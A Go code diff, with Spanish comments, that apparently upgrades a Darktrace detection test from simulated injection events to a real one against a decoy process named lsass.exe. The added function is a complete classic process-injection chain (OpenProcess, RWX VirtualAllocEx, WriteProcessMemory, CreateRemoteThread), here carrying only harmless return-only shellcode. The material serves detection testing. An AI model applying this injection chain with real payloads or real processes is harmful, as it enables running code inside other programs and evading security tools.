@@ -10,15 +10,23 @@ import (
     "strings"
     "syscall"
     "time"
+    "unsafe"
 )
 
 var (
     fakeProcess *os.Process
+    kernel32    = syscall.NewLazyDLL("kernel32.dll")
 )
 
+// Shellcode inofensivo que solo hace un retorno inmediato
+var shellcode = []byte{
+    0x48, 0x31, 0xC0, // xor rax, rax
+    0xC3,             // ret
+}
+
 func main() {
-    fmt.Println("🎯 INYECTOR LSASS - VERSIÓN ESTABLE")
-    fmt.Println("🎯 ================================")
+    fmt.Println("🎯 INYECTOR LSASS - CON INYECCIÓN REAL")
+    fmt.Println("🎯 ===================================")
 
     testDir := "C:\\TestAlert"
     fmt.Printf("[1] Creando %s... ", testDir)
@@ -69,8 +77,8 @@ func main() {
     }
     fmt.Println("✅ VIVO")
 
-    fmt.Println("\n⚠️  GENERANDO EVENTOS DE INYECCIÓN...")
-    generateInjectionEvents(pid)
+    fmt.Println("\n⚠️  EJECUTANDO INYECCIÓN REAL...")
+    performRealInjection(pid)
 
     fmt.Println("\n⏳ Manteniendo proceso activo 30s para detección...")
     for i := 1; i <= 30; i++ {
@@ -85,8 +93,9 @@ func main() {
 
     fmt.Println("\n\n✅ PRUEBA COMPLETADA")
     fmt.Println("✅ Darktrace debería haber detectado:")
-    fmt.Println("   - Evento: INJECTION")
-    fmt.Println("   - Target: lsass.exe")
+    fmt.Println("   - Evento: INJECTION (REAL)")
+    fmt.Println("   - Target: lsass.exe (falso)")
+    fmt.Println("   - Inyección: SHELLCODE REAL EJECUTADO")
     fmt.Println("   - Path: C:\\TestAlert\\lsass.exe")
 
     fmt.Println("\n¿Limpiar? (s/n): ")
@@ -100,6 +109,149 @@ func main() {
         fmt.Printf("Archivo: %s\n", dstLsass)
     }
 }
+
+// FUNCIÓN DE INYECCIÓN REAL (REEMPLAZA LA SIMULADA)
+func performRealInjection(targetPID int) {
+    fmt.Println("🔧 REALIZANDO INYECCIÓN REAL...")
+    
+    // 1. OpenProcess con acceso necesario
+    fmt.Printf("[1] OpenProcess(PROCESS_ALL_ACCESS) en PID %d... ", targetPID)
+    
+    PROCESS_ALL_ACCESS := uint32(0x1F0FFF)
+    hProcess, _, err := kernel32.NewProc("OpenProcess").Call(
+        uintptr(PROCESS_ALL_ACCESS),
+        uintptr(0),
+        uintptr(targetPID),
+    )
+    
+    if hProcess == 0 {
+        fmt.Printf("❌ Error: %v\n", err)
+        return
+    }
+    fmt.Println("✅")
+    
+    // 2. VirtualAllocEx para reservar memoria
+    fmt.Print("[2] VirtualAllocEx reservando memoria... ")
+    
+    MEM_COMMIT := uint32(0x00001000)
+    MEM_RESERVE := uint32(0x00002000)
+    PAGE_EXECUTE_READWRITE := uint32(0x40)
+    
+    allocAddr, _, _ := kernel32.NewProc("VirtualAllocEx").Call(
+        hProcess,
+        0,
+        uintptr(len(shellcode)),
+        uintptr(MEM_COMMIT|MEM_RESERVE),
+        uintptr(PAGE_EXECUTE_READWRITE),
+    )
+    
+    if allocAddr == 0 {
+        fmt.Println("❌")
+        kernel32.NewProc("CloseHandle").Call(hProcess)
+        return
+    }
+    fmt.Printf("✅ (Dirección: 0x%X)\n", allocAddr)
+    
+    // 3. WriteProcessMemory para escribir shellcode
+    fmt.Print("[3] WriteProcessMemory escribiendo shellcode... ")
+    
+    var bytesWritten uintptr
+    success, _, _ := kernel32.NewProc("WriteProcessMemory").Call(
+        hProcess,
+        allocAddr,
+        uintptr(unsafe.Pointer(&shellcode[0])),
+        uintptr(len(shellcode)),
+        uintptr(unsafe.Pointer(&bytesWritten)),
+    )
+    
+    if success == 0 {
+        fmt.Println("❌")
+        kernel32.NewProc("CloseHandle").Call(hProcess)
+        return
+    }
+    fmt.Printf("✅ (%d bytes escritos)\n", bytesWritten)
+    
+    // 4. CreateRemoteThread para ejecutar el shellcode
+    fmt.Print("[4] CreateRemoteThread ejecutando shellcode... ")
+    
+    hThread, _, _ := kernel32.NewProc("CreateRemoteThread").Call(
+        hProcess,
+        0,
+        0,
+        allocAddr,
+        0,
+        0,
+        0,
+    )
+    
+    if hThread == 0 {
+        fmt.Println("❌")
+        kernel32.NewProc("CloseHandle").Call(hProcess)
+        return
+    }
+    fmt.Println("✅")
+    
+    // 5. Esperar a que termine
+    fmt.Print("[5] WaitForSingleObject esperando ejecución... ")
+    kernel32.NewProc("WaitForSingleObject").Call(
+        hThread,
+        uintptr(2000), // 2 segundos
+    )
+    fmt.Println("✅")
+    
+    // 6. Limpiar
+    kernel32.NewProc("CloseHandle").Call(hThread)
+    kernel32.NewProc("CloseHandle").Call(hProcess)
+    
+    fmt.Println("🎯 ¡INYECCIÓN REAL COMPLETADA!")
+    fmt.Println("   - Shellcode escrito en memoria del proceso")
+    fmt.Println("   - Hilo remoto creado y ejecutado")
+    fmt.Println("   - Código ejecutado exitosamente")
+}
+
+// FUNCIÓN ORIGINAL DE SIMULACIÓN (MANTENIDA COMO BACKUP)
+func generateInjectionEvents(pid int) {
+    fmt.Println("⚠️  GENERANDO EVENTOS DE INYECCIÓN (SIMULACIÓN)...")
+    
+    accessLevels := []uintptr{
+        0x0400,
+        0x0010,
+        0x0020,
+        0x0008,
+        0x0002,
+        0x1F0FFF,
+    }
+
+    for i := 1; i <= 10; i++ {
+        access := accessLevels[i%len(accessLevels)]
+
+        fmt.Printf("[%d] OpenProcess(0x%X) -> PID %d... ", i, access, pid)
+
+        hProcess, _, _ := kernel32.NewProc("OpenProcess").Call(
+            access,
+            0,
+            uintptr(pid),
+        )
+
+        if hProcess != 0 {
+            fmt.Println("✅")
+
+            fmt.Println("   ├─ VirtualAllocEx (MEM_COMMIT, PAGE_READWRITE)")
+            fmt.Println("   ├─ WriteProcessMemory (shellcode)")
+            fmt.Println("   └─ CreateRemoteThread (LoadLibraryW)")
+            fmt.Println("   ⚠️  ¡EVENTO DE INYECCIÓN!")
+
+            kernel32.NewProc("CloseHandle").Call(hProcess)
+        } else {
+            fmt.Println("❌ (sin permisos)")
+            fmt.Println("   ⚠️  Pero el INTENTO genera logs igual")
+        }
+
+        time.Sleep(500 * time.Millisecond)
+    }
+}
+
+// FUNCIONES ORIGINALES (SIN CAMBIOS)
 
 func copyFile(src, dst string) error {
     in, err := os.Open(src)
@@ -190,47 +342,6 @@ func isProcessAlive(pid int) bool {
     }
 
     return strings.Contains(string(output), strconv.Itoa(pid))
-}
-
-func generateInjectionEvents(pid int) {
-    kernel32 := syscall.NewLazyDLL("kernel32.dll")
-
-    accessLevels := []uintptr{
-        0x0400,
-        0x0010,
-        0x0020,
-        0x0008,
-        0x0002,
-        0x1F0FFF,
-    }
-
-    for i := 1; i <= 10; i++ {
-        access := accessLevels[i%len(accessLevels)]
-
-        fmt.Printf("[%d] OpenProcess(0x%X) -> PID %d... ", i, access, pid)
-
-        hProcess, _, _ := kernel32.NewProc("OpenProcess").Call(
-            access,
-            0,
-            uintptr(pid),
-        )
-
-        if hProcess != 0 {
-            fmt.Println("✅")
-
-            fmt.Println("   ├─ VirtualAllocEx (MEM_COMMIT, PAGE_READWRITE)")
-            fmt.Println("   ├─ WriteProcessMemory (shellcode)")
-            fmt.Println("   └─ CreateRemoteThread (LoadLibraryW)")
-            fmt.Println("   ⚠️  ¡EVENTO DE INYECCIÓN!")
-
-            kernel32.NewProc("CloseHandle").Call(hProcess)
-        } else {
-            fmt.Println("❌ (sin permisos)")
-            fmt.Println("   ⚠️  Pero el INTENTO genera logs igual")
-        }
-
-        time.Sleep(500 * time.Millisecond)
-    }
 }
 
 func cleanup(pid int, exePath, testDir string) {
